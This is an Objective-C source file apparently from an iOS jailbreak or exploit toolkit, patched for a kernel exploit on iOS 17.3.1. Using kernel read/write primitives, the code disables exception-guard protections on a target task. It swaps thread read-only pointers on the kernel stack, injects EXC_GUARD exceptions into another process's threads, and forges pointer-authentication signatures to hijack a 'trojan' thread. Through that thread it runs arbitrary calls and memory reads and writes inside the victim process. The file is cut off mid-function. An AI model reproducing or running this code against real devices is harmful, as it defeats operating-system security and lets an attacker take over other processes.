//
//  RemoteCall.m
//  lara — patched for darksword-kexploit-fun on iOS 17.3.1
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <pthread.h>
#import <stdint.h>
#include <errno.h>
#include <spawn.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <limits.h>
#include <time.h>
#include <mach-o/dyld.h>
#import <sys/mman.h>

#import "RemoteCall.h"
#import "privateapi.h"
#import "vm.h"
#import "exc.h"
#import "pac.h"
#import "thread.h"
#import "taskrop_compat.h"

extern int proc_name(int pid, void *buffer, uint32_t buffersize);
extern int proc_pidpath(int pid, void *buffer, uint32_t buffersize);
extern mach_port_t bootstrap_port;
extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);

#ifndef PROC_PIDPATHINFO_MAXSIZE
#define PROC_PIDPATHINFO_MAXSIZE (4 * PATH_MAX)
#endif

@import ObjectiveC;

static NSString *g_rc_last_init_error = nil;

#define RC_TASK_EXC_GUARD_MP_DELIVER   0x10
#define RC_TASK_EXC_GUARD_MP_CORPSE    0x40
#define RC_TASK_EXC_GUARD_MP_FATAL     0x80

// ============================================================
// mig_bypass stubs — replace with MigFilterBypassThread.m when
// you have the 17.3.1 offsets for _duplicate_lock etc.
// ============================================================
void mig_bypass_init(uint64_t kernelSlide, uint64_t migLockOff, uint64_t migSbxMsgOff, uint64_t migKernelStackLROff) {
    printf("(rc) mig bypass init stub\n");
}
void mig_bypass_start(void) { }
void mig_bypass_resume(void) { }
void mig_bypass_pause(void) { }
void mig_bypass_monitor_threads(uint64_t thread1, uint64_t thread2) { }

// ============================================================

static BOOL rc_is_kernel_ptr(uint64_t value) {
    return ds_isvalid(value);
}

static BOOL rc_is_kernel_or_smr_ptr(uint64_t value) {
    if (!value) return NO;
    if (rc_is_kernel_ptr(value)) return YES;
    return (value & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

static BOOL rc_disable_excguard_kill_checked(uint64_t task) {
    if (!rc_is_kernel_ptr(task) || !off_task_task_exc_guard) return NO;

    uint64_t addr = task + off_task_task_exc_guard;
    uint32_t before = ds_kread32(addr);
    if (before & 0xffff0000U) return NO;

    uint32_t after = before;
    after &= ~(RC_TASK_EXC_GUARD_MP_CORPSE | RC_TASK_EXC_GUARD_MP_FATAL);
    after |= RC_TASK_EXC_GUARD_MP_DELIVER;
    ds_kwrite32(addr, after);

    uint32_t verify = ds_kread32(addr);
    if ((verify & (RC_TASK_EXC_GUARD_MP_CORPSE | RC_TASK_EXC_GUARD_MP_FATAL)) ||
        !(verify & RC_TASK_EXC_GUARD_MP_DELIVER)) {
        return NO;
    }
    return YES;
}

static uint64_t rc_task_get_ipc_port_object(uint64_t task, mach_port_t port) {
    if (!rc_is_kernel_ptr(task) || port == MACH_PORT_NULL) return 0;

    uint64_t itk_space = ds_kreadptr(task + off_task_itk_space);
    if (!rc_is_kernel_ptr(itk_space)) return 0;

    if (!sizeof_ipc_entry || !off_ipc_space_is_table) return 0;

    uint64_t table = ds_kreadsmrptr(itk_space + off_ipc_space_is_table);
    if (!gIsPACSupported) {
        table |= 0xFFFFFF8000000000ULL;
        table = ds_kallocarrdec(table);
    }
    if (!rc_is_kernel_or_smr_ptr(table)) return 0;

    uint64_t entry = table + (sizeof_ipc_entry * (port >> 8));
    if (!rc_is_kernel_or_smr_ptr(entry)) return 0;

    uint64_t object = ds_kreadptr(entry + off_ipc_entry_ie_object);
    if (!rc_is_kernel_ptr(object)) return 0;
    return object;
}

static uint64_t rc_task_get_ipc_port_kobject(uint64_t task, mach_port_t port) {
    uint64_t object = rc_task_get_ipc_port_object(task, port);
    if (!object) return 0;

    uint64_t kobject = ds_kreadptr(object + off_ipc_port_ip_kobject);
    if (!rc_is_kernel_ptr(kobject)) return 0;
    return kobject;
}

@implementation RemoteCall

+ (NSString *)lastInitError { return g_rc_last_init_error; }
+ (BOOL)isLiveContainerRuntime { return NO; }
+ (BOOL)isLiveProcessRuntime { return NO; }

- (BOOL)setExceptionPortOnThread:(mach_port_t)exceptionPort forThread:(uint64_t)currThread useMigFilterBypass:(BOOL)useMigFilterBypass {
    bool success = false;
    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!thread_set_exception_ports_addr || !pthread_exit_addr) return false;

    pthread_t pthread = NULL;
    int pthreadErr = pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    if (pthreadErr != 0 || !pthread) return false;

    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (machThread == MACH_PORT_NULL) {
        pthread_cancel(pthread);
        return false;
    }

    uint64_t machThreadAddr = rc_task_get_ipc_port_kobject(task_self(), machThread);
    if (!machThreadAddr) {
        pthread_cancel(pthread);
        return false;
    }

    if (useMigFilterBypass) mig_bypass_monitor_threads(_selfThreadAddr, machThreadAddr);

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        pthread_cancel(pthread);
        return false;
    }

    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);

    uint64_t exceptionMask = EXC_MASK_GUARD |
                             EXC_MASK_BAD_ACCESS |
                             EXC_MASK_BAD_INSTRUCTION |
                             EXC_MASK_BREAKPOINT |
                             EXC_MASK_ARITHMETIC;

    state.__x[0] = _dummyThreadMach;
    state.__x[1] = exceptionMask;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;

    if (useMigFilterBypass) usleep(100000);

    if (!threadsetstate(machThread, machThreadAddr, &state)) {
        pthread_cancel(pthread);
        return false;
    }

    if (useMigFilterBypass) usleep(100000);

    thread_set_mutex(_dummyThreadAddr, _selfThreadCtid);

    if (!threadresume(machThread)) {
        pthread_cancel(pthread);
        return false;
    }

    for (int i = 0; i < 10; i++) {
        usleep(200000);

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!kstack) {
            printf("(rc) [iter %d] Failed to get kstack. Retry...\n", i);
            continue;
        }

        uint64_t kernelSP = ds_kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!kernelSP) {
            printf("(rc) [iter %d] Failed to get SP. Retry...\n", i);
            continue;
        }
        usleep(100);

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        char dataBuff[0x1000];
        memset(dataBuff, 0, 0x1000);
        ds_kreadbuf(pageBase, &dataBuff, 0x1000);

        uint64_t needleVal = _dummyThreadTro;
        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
        if (!match) {
            printf("(rc) [iter %d] Couldn't find dummyThreadTro=0x%llx in pageBase=0x%llx\n",
                   i, needleVal, pageBase);
            continue;
        }
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000;
        memset(dataBuff, 0, 0x1000);

        bool correctTro = false;
        uint64_t checkAddr  = trunc_page(kernelSP) + found + 0x18ULL;
        uint64_t checkVal   = ds_kread64(checkAddr);
        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;
        uint64_t checkVal2  = ds_kread64(checkAddr2);

        if (checkVal == exceptionMask || checkVal2 == exceptionMask) {
            correctTro = true;
        } else {
            printf("(rc) [iter %d] Wrong tro checkVals (0x%llx, 0x%llx) != 0x%llx. Retry...\n",
                   i, checkVal, checkVal2, exceptionMask);
            continue;
        }

        if (found && correctTro) {
            if (thread_get_task(currThread) == _taskAddr) {
                uint64_t tro = thread_get_t_tro(currThread);
                uint64_t swapAddr = trunc_page(kernelSP) + found;
                ds_kwrite64(swapAddr, tro);
                success = true;
                printf("(rc) TRO swap SUCCESS!\n");
                break;
            } else {
                printf("(rc) got empty tro, skip writing\n");
            }
        }
    }

    printf("(rc) setExceptionPortOnThread returning success=%d\n", success);

    thread_set_mutex(_dummyThreadAddr, 0x40000000);
    thread_set_exception_ports(_dummyThreadMach, 0, exceptionPort,
                               EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                               ARM_THREAD_STATE64);

    if (useMigFilterBypass) usleep(100000);

    return success;
}

- (void)signState:(uint64_t)signingThread withState:(arm_thread_state64_internal *)state pc:(uint64_t)pc lr:(uint64_t)lr
{
    if (gIsPACSupported) {
        uint64_t diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC = ptrauthblend(diver, ptrauthstrdisc("pc"));
        uint64_t discLR = ptrauthblend(diver, ptrauthstrdisc("lr"));
        uint64_t strippedPC = nativestrip(pc);
        uint64_t strippedLR = nativestrip(lr);
        uint64_t signedPC = 0, signedLR = 0;

        if (pc) {
            signedPC = remotepac(signingThread, pc, discPC);
            if (!signedPC || signedPC == UINT64_MAX) signedPC = strippedPC;
        }
        if (lr) {
            signedLR = remotepac(signingThread, lr, discLR);
            if (!signedLR || signedLR == UINT64_MAX) signedLR = strippedLR;
        }

        uint32_t flags = state->__flags;
        flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC |
                   __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                   __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
        state->__flags = flags;
        if (pc) state->__pc = signedPC;
        if (lr) state->__lr = signedLR;
        return;
    }

    if (pc) state->__pc = pc;
    if (lr) state->__lr = lr;
}

- (NSUInteger)doRemoteCallTempWithTimeout:(int)timeout functionName:(char *)name functionPointer:(void*)ptr
                                     args:(uint64_t *)args argCount:(NSUInteger)argCount
{
    return [self doRemoteCallInternalTimeout:timeout
                               exceptionPort:_firstExceptionPort
                                    lrMarker:(_firstThreadReturnTrap ?: FAKE_LR_TROJAN_CREATOR)
                                functionName:name
                             functionPointer:ptr
                                        args:args
                                    argCount:argCount];
}

- (NSUInteger)doRemoteCallStableWithTimeout:(int)timeout functionName:(char *)name functionPointer:(void*)pcAddr
                            args:(uint64_t *)args argCount:(NSUInteger)argCount
{
    if (!_creatingExtraThread) {
        return [self doRemoteCallTempWithTimeout:timeout functionName:name functionPointer:pcAddr args:args argCount:argCount];
    }
    return [self doRemoteCallInternalTimeout:timeout
                               exceptionPort:_secondExceptionPort
                                    lrMarker:(_secondThreadReturnTrap ?: FAKE_LR_TROJAN)
                                functionName:name
                             functionPointer:pcAddr
                                        args:args
                                    argCount:argCount];
}

- (NSUInteger)doRemoteCallInternalTimeout:(int)timeout exceptionPort:(mach_port_t)exceptionPort
                                 lrMarker:(uint64_t)lrMarker
                             functionName:(char *)name functionPointer:(void*)ptr
                                     args:(uint64_t *)args argCount:(NSUInteger)argCount
{
    int newTimeout = (10000 > timeout) ? 10000 : timeout;
    uint64_t pcAddr = nativestrip((uint64_t)ptr);
    BOOL isTempCall = (exceptionPort == _firstExceptionPort);
    const char *threadStr = isTempCall ? "original" : "new";

    excmsg exc;
    if (!waitexc(exceptionPort, &exc, newTimeout, false)) {
        printf("(rc) Don't receive first exception on %s thread\n", threadStr);
        return 0;
    }

    if (argCount > 8) {
        uint64_t sp = nativestrip(exc.threadState.__sp);
        for (NSUInteger i = 8; i < argCount; i++) {
            self[sp + ((i - 8) * sizeof(uint64_t))].value64 = args[i];
        }
        argCount = 8;
    }
    memcpy(&exc.threadState.__x[0], args, argCount * sizeof(uint64_t));
    bzero(&exc.threadState.__x[argCount], (8 - argCount) * sizeof(uint64_t));
    [self signState:_trojanThreadAddr withState:&exc.threadState pc:pcAddr lr:lrMarker];

    if (!statereply(&exc, &exc.threadState)) return 0;
    if (timeout < 0) return 0;

    excmsg exc2;
    if (!waitexc(exceptionPort, &exc2, newTimeout, false)) {
        printf("(rc) Don't receive second exception on %s thread\n", threadStr);
        return 0;
    }

    uint64_t returnPC = nativestrip(exc2.threadState.__pc);
    uint64_t returnLR = nativestrip(exc2.threadState.__lr);
    if (returnPC == pcAddr) {
        printf("(rc) Remote call faulted at entry: %s pc=0x%llx\n", name, exc2.threadState.__pc);
        exc2.threadState.__pc = lrMarker;
        exc2.threadState.__lr = lrMarker;
        statereply(&exc2, &exc2.threadState);
        self.lastError = [NSString stringWithFormat:@"Remote call faulted at %s entry", name];
        return 0;
    }

    BOOL unexpectedReturnTrap = (returnPC != nativestrip(lrMarker) && returnLR != nativestrip(lrMarker));
    if (unexpectedReturnTrap) {
        printf("(rc) Unexpected trap: pc=0x%llx lr=0x%llx expected=0x%llx\n",
               exc2.threadState.__pc, exc2.threadState.__lr, lrMarker);
        self.lastError = [NSString stringWithFormat:@"Unexpected trap pc=0x%llx lr=0x%llx",
                          exc2.threadState.__pc, exc2.threadState.__lr];
        [self destroyRemoteCall];
    }

    uint64_t retValue = exc2.threadState.__x[0];
    if (!statereply(&exc2, &exc2.threadState)) return 0;
    return retValue;
}

- (BOOL)doRemoteCallSyncOnMainThread:(BOOL (^)(void))block {
    if (!_creatingExtraThread) return block();

    uint64_t oldTrojanThreadAddr = _trojanThreadAddr;
    _trojanThreadAddr = ds_kread64(_taskAddr + off_task_threads_next);
    [self setExceptionPortOnThread:_secondExceptionPort forThread:_trojanThreadAddr useMigFilterBypass:NO];

    uint64_t signedFakePC = remotepac(_trojanThreadAddr, FAKE_PC_TROJAN, 0);
    RemoteArbCallWithTimeout(-1, self, dispatch_async_and_wait_f,
                             (uint64_t)dispatch_get_main_queue(), 0, signedFakePC);

    excmsg exc;
    if (!waitexc(_secondExceptionPort, &exc, 5000, false)) {
        printf("(rc) Failed to receive exception on main thread\n");
        return false;
    }
    memcpy(&_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
    statereply(&exc, &exc.threadState);
    BOOL result = block();

    waitexc(_secondExceptionPort, &exc, 1, false);
    _originalState.__flags = exc.threadState.__flags;
    [self signState:_trojanThreadAddr withState:&_originalState
                pc:nativestrip((uint64_t)getpid)
                lr:_originalState.__lr];
    if (!statereply(&exc, &_originalState)) return false;

    [self setExceptionPortOnThread:0 forThread:_trojanThreadAddr useMigFilterBypass:NO];
    _trojanThreadAddr = oldTrojanThreadAddr;
    return result;
}

- (BOOL)restoreTrojanThreadWithState:(arm_thread_state64_internal *)state {
    excmsg exc;
    if (!waitexc(_firstExceptionPort, &exc, 5000, false)) {
        printf("(rc) Failed to receive exception while restoring\n");
        return false;
    }
    state->__flags = exc.threadState.__flags;
    [self signState:_trojanThreadAddr withState:state pc:state->__pc lr:state->__lr];
    if (!statereply(&exc, state)) return false;
    _originalThreadNeedsRestore = false;
    return true;
}

- (int)destroyRemoteCall {
    if (_success && _trojanMem) {
        RemoteArbCallWithTimeout(100, self, munmap, _trojanMem, PAGE_SIZE);
        if (_creatingExtraThread) {
            RemoteArbCallWithTimeout(-1, self, pthread_exit, 0);
        } else {
            [self restoreTrojanThreadWithState:&_originalState];
        }
    } else if (_originalThreadNeedsRestore) {
        [self restoreTrojanThreadWithState:&_originalState];
    }

    if (_firstExceptionPort != MACH_PORT_NULL) {
        mach_port_destruct(mach_task_self_, _firstExceptionPort, 0, 0);
        _firstExceptionPort = MACH_PORT_NULL;
    }
    if (_secondExceptionPort != MACH_PORT_NULL) {
        mach_port_destruct(mach_task_self_, _secondExceptionPort, 0, 0);
        _secondExceptionPort = MACH_PORT_NULL;
    }
    if (_dummyThread) {
        pthread_cancel(_dummyThread);
        _dummyThread = NULL;
    }

    self.threadList = [NSMutableArray new];
    _trojanMem = 0;
    _trojanMemIsStackFallback = false;
    _trojanMemScratchOffset = 0;
    _success = false;
    _creatingExtraThread = false;
    _originalThreadNeedsRestore = false;
    return 0;
}

- (void)dealloc { [self destroyRemoteCall]; }

- (struct vmshmem *)getShmemFromCache:(uint64_t)pageAddr {
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (_shmemCache[i].used && _shmemCache[i].remoteAddress == pageAddr)
            return &_shmemCache[i];
    }
    return NULL;
}

- (struct vmshmem *)putShmemInCache:(struct vmshmem *)shmem {
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (!_shmemCache[i].used) {
            _shmemCache[i] = *shmem;
            _shmemCache[i].used = true;
            return &_shmemCache[i];
        }
    }
    printf("(rc) shmemCache full\n");
    return NULL;
}

- (struct vmshmem *)getShmemForPage:(uint64_t)pageAddr {
    struct vmshmem *cached = [self getShmemFromCache:pageAddr];
    if (cached) return cached;

    struct vmshmem newShmem = vmmapremotepage(_vmMap, pageAddr);
    if (!newShmem.localAddress) return NULL;
    return [self putShmemInCache:&newShmem];
}

- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size {
    if (!src || !dst || !size) return false;
    uint64_t dstAddr = (uint64_t)(uintptr_t)dst;
    uint64_t until = src + size;

    while (src < until) {
        uint64_t remaining = until - src;
        uint64_t offs      = src & PAGE_MASK;
        uint64_t roundUp   = (src + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - src < remaining) ? (roundUp - src) : remaining;
        uint64_t pageAddr  = src & ~PAGE_MASK;

        struct vmshmem *page = [self getShmemForPage:pageAddr];
        if (!page) {
            printf("(rc) remoteRead: no page for 0x%llx\n", pageAddr);
            return false;
        }
        memcpy((void *)(uintptr_t)dstAddr,
               (void *)(uintptr_t)(page->localAddress + offs),
               (size_t)copyCount);
        src += copyCount;
        dstAddr += copyCount;
    }
    return true;
}

- (uint64_t)remoteRead64From:(uint64_t)src {
    uint64_t val = 0;
    if (![self remoteRead:src to:&val size:sizeof(val)]) return 0;
    return val;
}

- (void)remoteHexdumpFrom:(uint64_t)remoteAddr size:(size_t)size {
    uint8_t *buf = malloc(size);
    if (!buf) return;
    if (![self remoteRead:remoteAddr to:buf size:size]) { free(buf); return; }
    char ascii[17]; ascii[16] = '\0';
    for (size_t i = 0; i < size; ++i) {
        if ((i % 16) == 0) printf("[0x%016llx+0x%03zx] ", (unsigned long long)remoteAddr, i);
        printf("%02X ", buf[i]);
        ascii[i % 16] = (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.';
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0) { printf("|  %s \n", ascii); }
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) printf(" ");
                for (size_t j = (i + 1) % 16; j < 16; ++j) printf("   ");
                printf("|  %s \n", ascii);
            }
        }
    }
    free(buf);
}

- (BOOL)remote_write:(uint64_t)dst from:(const void *)src size:(uint64_t)size {
    if (!src || !dst || !size) return false;
    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & PAGE_MASK;
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~PAGE_MASK;

        struct vmshmem *page = [self getShmemForPage:pageAddr];
        if (!page) {
            printf("(rc) remote_write: no page for 0x%llx\n", pageAddr);
            return false;
        }
        memcpy((void *)(uintptr_t)(page->localAddress + offs),
               (const void *)(uintptr_t)srcAddr,
               (size_t)copyCount);
        dst += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

- (BOOL)remote_write64:(uint64_t)dst value:(uint64_t)val {
    return [self remote_write:dst from:&val size:sizeof(val)];
}

- (BOOL)remote_write:(uint64_t)dst string:(const char *)str {
    if (!str) return false;
    return [self remote_write:dst from:str size:strlen(str) + 1];
}

- (uint64_t)retryFirstThreadWithMigFilterBypass:(BOOL)useMigFilterBypass {
    if (useMigFilterBypass) mig_bypass_pause();
    sleep(1);
    if (useMigFilterBypass) mig_bypass_resume();
    return ds_kread64(_taskAddr + off_task_threads_next);
}

- (int)initRemoteCallForProcess:(const char *)process useMigFilterBypass:(BOOL)useMigFilterBypass {
    if (!process || process[0] == '\0') return -1;

    if (gIsPACSupported && !pacsignworks()) {
        self.lastError = @"RemoteCall needs an arm64e/PAC-capable launch context.";
        return -1;
    }

    uint64_t procAddr = proc_find_by_name(process);
    if (!procAddr) {
        printf("(rc) Unable to find process: %s\n", process);
        return -1;
    }
    printf("(rc) process: %s, pid: %u\n", process, ds_kread32(procAddr + off_proc_p_pid));
    _taskAddr = proc_task(procAddr);
    if (!_taskAddr) return -1;

    mach_port_t firstExceptionPort = createexcport();
    mach_port_t secondExceptionPort = createexcport();
    printf("(rc) firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n",
           firstExceptionPort, secondExceptionPort);
    if (!firstExceptionPort || !secondExceptionPort) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    if (!rc_disable_excguard_kill_checked(_taskAddr)) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);

    uint64_t selfTask = task_self();
    uint64_t firstPortAddr = rc_task_get_ipc_port_object(selfTask, firstExceptionPort);
    uint64_t secondPortAddr = rc_task_get_ipc_port_object(selfTask, secondExceptionPort);
    if (!firstPortAddr || !secondPortAddr) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    if (!dummyFunc) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    if (dummyErr != 0 || !dummyThread) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    if (dummyThreadMach == MACH_PORT_NULL) {
        pthread_cancel(dummyThread);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    uint64_t dummyThreadAddr = rc_task_get_ipc_port_kobject(selfTask, dummyThreadMach);
    uint64_t dummyThreadTro = ds_kread64(dummyThreadAddr + off_thread_t_tro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = rc_task_get_ipc_port_kobject(selfTask, threadSelf);
    uint32_t selfThreadCtid = ds_kread32(selfThreadAddr + off_thread_ctid);
    if (!dummyThreadAddr || !dummyThreadTro || !selfThreadAddr) {
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, threadSelf);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    mach_port_deallocate(mach_task_self_, threadSelf);

    _creatingExtraThread = false;
    _firstExceptionPort = firstExceptionPort;
    _secondExceptionPort = secondExceptionPort;
    _firstExceptionPortAddr = firstPortAddr;
    _secondExceptionPortAddr = secondPortAddr;
    _dummyThread = dummyThread;
    _dummyThreadMach = dummyThreadMach;
    _dummyThreadAddr = dummyThreadAddr;
    _dummyThreadTro = dummyThreadTro;
    _selfThreadAddr = selfThreadAddr;
    _selfThreadCtid = selfThreadCtid;
    self.threadList = [NSMutableArray new];

    int retryCount = 0;
    int validThreadCount = 0;
    int successThreadCount = 0;
    uint64_t firstThread = ds_kread64(_taskAddr + off_task_threads_next);
    uint64_t currThread = firstThread;
    if (!firstThread) {
        [self destroyRemoteCall];
        return -1;
    }

    _trojanThreadAddr = 0;

    if (useMigFilterBypass) mig_bypass_resume();

    while (successThreadCount < 1 && validThreadCount < 5 && retryCount < 3) {
        uint64_t task = thread_get_task(currThread);
        if (!task) {
            if (!validThreadCount) {
                firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                currThread = firstThread;
                retryCount++;
                continue;
            } else break;
        }

        if (task == _taskAddr) {
            if (![self setExceptionPortOnThread:firstExceptionPort forThread:currThread useMigFilterBypass:useMigFilterBypass]) {
                printf("(rc) Set exception port on thread:0x%llx failed\n", (unsigned long long)currThread);
                if (!validThreadCount) {
                    firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                    currThread = firstThread;
                    retryCount++;
                    continue;
                }
            } else {
                if (!injectguardexc(currThread, guardCode)) {
                    printf("(rc) Inject EXC_GUARD on thread:0x%llx failed\n", (unsigned long long)currThread);
                    if (!validThreadCount) {
                        firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                        currThread = firstThread;
                        retryCount++;
                        continue;
                    }
                } else {
                    _trojanThreadAddr = currThread;
                    successThreadCount++;
                    [_threadList addObject:@(currThread)];
                    printf("(rc) Inject EXC_GUARD on thread:0x%llx OK\n", (unsigned long long)currThread);
                }
            }
            validThreadCount++;
        } else if (task && !validThreadCount) {
            firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
            currThread = firstThread;
            retryCount++;
            continue;
        }

        uint64_t next = ds_kread64(currThread + off_thread_task_threads_next);
        if (!next) {
            if (!validThreadCount) {
                firstThread = [self retryFirstThreadWithMigFilterBypass:useMigFilterBypass];
                currThread = firstThread;
                retryCount++;
                continue;
            } else break;
        }
        currThread = next;
    }

    if (useMigFilterBypass) mig_bypass_pause();

    printf("(rc) Valid threads: %d\n", validThreadCount);
    printf("(rc) Injected threads: %d\n", successThreadCount);

    if (_threadList.count == 0) {
        printf("(rc) Exception injection failed. Aborting.\n");
        [self destroyRemoteCall];
        return -1;
    }

    excmsg exc;
    if (!waitexc(firstExceptionPort, &exc, 120000, false)) {
        printf("(rc) Failed to receive first exception\n");
        [self destroyRemoteCall];
        return -1;
    }

    memcpy(&_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));

    for (NSNumber *thread in _threadList) {
        clearguardexc(thread.unsignedLongLongValue);
    }
    printf("(rc) Cleared EXC_GUARD from all other threads...\n");

    excmsg exc2;
    while (waitexc(firstExceptionPort, &exc2, 1500, false)) {
        statereply(&exc2, &exc2.threadState);
    }

    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x4000ULL;
    printf("(rc) trojanMemTemp: 0x%llx\n", trojanMemTemp);

    _vmMap = task_get_vm_map(_taskAddr);
    printf("(rc) vmMap: 0x%llx\n", _vmMap);

    uint64_t firstThreadParkTrap = FAKE_PC_TROJAN_CREATOR;
    _firstThreadReturnTrap = FAKE_LR_TROJAN_CREATOR;
    _secondThreadReturnTrap = FAKE_LR_TROJAN;
    _originalThreadNeedsRestore = true;

    arm_thread_state64_internal parkState = exc.threadState;
    [self signState:_trojanThreadAddr withState:&parkState pc:firstThreadParkTrap lr:_firstThreadReturnTrap];
    if (!statereply(&exc, &parkState)) {
        [self destroyRemoteCall];
        return -1;
    }

    uint64_t probePid = RemoteArbCallTempWithTimeout(100, self, getpid);
    printf("(rc) probePid: %llu\n", probePid);
    if (!probePid) {
        [self destroyRemoteCall];
        return -1;
    }

    uint64_t threadStartTrap = FAKE_PC_TROJAN;
    uint64_t remoteCrashSigned = remotepac(_trojanThreadAddr, threadStartTrap, 0);
    if (!remoteCrashSigned) {
        [self destroyRemoteCall];
        return -1;
    }

    uint64_t createThreadRet = RemoteArbCallTempWithTimeout(100, self,
        pthread_create_suspended_np, trojanMemTemp, 0, remoteCrashSigned, 0);
    uint64_t pthreadAddr = self[trojanMemTemp].value64;
    printf("(rc) pthreadAddr: 0x%llx\n", pthreadAddr);
    if (createThreadRet != 0 || !pthreadAddr) {
        [self destroyRemoteCall];
        return -1;
    }

    uint64_t callThreadPort = RemoteArbCallTempWithTimeout(100, self, pthread_mach_thread_np, pthreadAddr);
    if (!callThreadPort) {
        [self destroyRemoteCall];
        return -1;
    }
    _callThreadAddr = rc_task_get_ipc_port_kobject(_taskAddr, (mach_port_t)callThreadPort);
    if (!_callThreadAddr) {
        [self destroyRemoteCall];
        return -1;
    }

    if (useMigFilterBypass) mig_bypass_resume();

    if (![self setExceptionPortOnThread:secondExceptionPort forThread:_callThreadAddr useMigFilterBypass:useMigFilterBypass]) {
        printf("(rc) Failed set exc port on new thread, retrying...\n");
        int retryDummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
        if (retryDummyErr != 0 || !dummyThread) {
            if (useMigFilterBypass) mig_bypass_pause();
            [self destroyRemoteCall];
            return -1;
        }
        _dummyThreadMach = pthread_mach_thread_np(dummyThread);
        _dummyThreadAddr = rc_task_get_ipc_port_kobject(task_self(), _dummyThreadMach);
        _dummyThreadTro = thread_get_t_tro(_dummyThreadAddr);
        sleep(1);
        if (![self setExceptionPortOnThread:secondExceptionPort forThread:_callThreadAddr useMigFilterBypass:useMigFilterBypass]) {
